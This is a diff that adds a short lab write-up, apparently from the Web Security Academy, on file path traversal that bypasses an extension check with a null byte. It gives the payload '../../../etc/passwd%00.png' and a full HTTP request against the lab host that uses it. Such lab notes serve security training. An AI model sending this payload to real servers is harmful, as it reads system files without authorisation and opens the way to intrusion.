@@ -1,0 +1,21 @@
+File path traversal, validation of file extension with null byte bypass
+
+The server checks if the file is a .png. We can sneak that in by using a null byte after your desired file: %00
+
+Payload:
+../../../etc/passwd%00.png
+
+Request:
+
+GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
+Host: ac261f201f2f2437813d0b3000180057.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://ac261f201f2f2437813d0b3000180057.web-security-academy.net/product?productId=1
+Connection: close
+Cookie: session=FDRVwRemkQH1e4bsb7gSN8dBUIDGxMgI
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
